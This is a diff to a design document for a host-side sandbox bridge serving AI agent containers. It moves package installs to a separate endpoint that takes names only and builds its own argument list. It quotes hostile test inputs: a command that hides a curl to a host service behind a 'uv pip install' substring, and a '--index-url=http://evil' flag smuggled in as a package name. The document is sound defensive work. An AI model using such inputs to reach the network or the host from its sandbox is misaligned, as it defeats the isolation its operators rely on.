@@ -133,11 +133,15 @@ anything else reachable by raw IP.
 
 **Therefore:**
 
-- `run(command)` gets `--network none`. Arbitrary code never has network.
-- `install(packages)` gets the default bridge network, but can only ever execute
-  `uv pip install` against names matching `^[A-Za-z0-9._-]+(==[A-Za-z0-9._-]+)?$`. The
-  command shape is fixed by the server; the agent supplies names, never flags. This
-  preserves unfrozen dependencies, which was the entire point of allowing network.
+- `run(command)` → `POST /exec`, always `--network none`. Arbitrary code never has
+  network.
+- `install(packages)` → `POST /install`, which has network but takes **only package
+  names** and builds its own argv. The agent never supplies a command or a flag on the
+  networked path. This preserves unfrozen dependencies, which was the entire point of
+  allowing network.
+
+The separation must live in the **bridge**, not the MCP — see the endpoint table for
+why a network flag or a command-substring check both fail.
 
 Cost: a script cannot fetch a dataset mid-run. The existing `file-download` MCP already
 covers URL-to-workspace fetching under its own least-privilege rules.
@@ -189,7 +193,24 @@ Host-side daemon on port 9501. Stdlib `ThreadingHTTPServer`, closely mirroring
 | Method | Path | Body | Response |
 |---|---|---|---|
 | POST | `/exec/{agent}` | `{"command": str, "timeout": int}` | `{"exit_code", "stdout", "stderr", "timed_out", "duration_s"}` |
+| POST | `/install/{agent}` | `{"packages": [str]}` — **no command field** | same shape |
 | GET | `/status` | — | running container count, per-agent |
+
+**Two endpoints, not one endpoint with a network flag or a command-shape check.** This
+is the whole trust boundary and it is easy to get subtly wrong:
+
+- Routing on a request field (`{"network": true}`) puts the decision in the bot
+  container — the party the bridge allowlist already assumes may be compromised.
+- Routing by inspecting the command string is spoofable. A `"uv pip install " in
+  command` check is defeated by
+  `run("echo 'uv pip install '; curl http://host.docker.internal:9500/status")`.
+
+`/exec` always passes `--network none`. `/install` never receives a command at all: it
+takes package names, validates each against `^[A-Za-z0-9._-]+(==[A-Za-z0-9._-]+)?$`,
+and the **bridge** builds the argv itself — `uv venv --system-site-packages` on first
+use, then `uv pip install --python {ws}/.venv/bin/python <names>`. The network-enabled
+path is therefore structurally incapable of running an arbitrary command, rather than
+being prevented from it by a check.
 
 **Config** (`config.json`): `workspaces_root` (host path), `image`, `listen_host`,
 `listen_port`, `secret`, `max_concurrent`, `default_timeout`, `max_timeout`, and an
@@ -262,9 +283,10 @@ run(command: str, timeout: int = 180) -> str        # JSON; --network none
 install(packages: list[str]) -> str                 # JSON; network, fixed command shape
 ```
 
-`install` validates every name against `^[A-Za-z0-9._-]+(==[A-Za-z0-9._-]+)?$` and
-builds the argv itself, so an agent can never smuggle a flag such as `--index-url`. It
-bootstraps `{workspace}/.venv` on first use.
+`run` posts to `/exec`; `install` posts to `/install` and forwards only the package
+list. Name validation and argv construction happen in the **bridge**, so a compromised
+bot container cannot reach the networked path with an arbitrary command either. The MCP
+may validate too, but that is convenience, not the control.
 
 The agent name is **not** a parameter — it comes from the process environment and goes
 into the URL path. An agent cannot address another agent's sandbox.
@@ -617,7 +639,10 @@ asserted. Each asserts the sandbox *fails*:
   network flags.
 - `curl http://host.docker.internal:9501/exec/main` without the secret → rejected
   (exercised from `install`, the one path that has network)
-- `install(["--index-url=http://evil"])` → rejected by name validation, no network call
+- `install(["--index-url=http://evil"])` → rejected by bridge-side name validation
+- **`POST /exec` with `"echo 'uv pip install '; curl host.docker.internal:9500"` → no
+  network.** Asserts the split lives in endpoint routing, not command inspection.
+- `POST /install` with a `command` field → field ignored, only `packages` honored
 
 **Re-run these after any Claude CLI version bump.** The bot container's protections are
 upstream behavior rather than configuration, and nothing else here would catch a
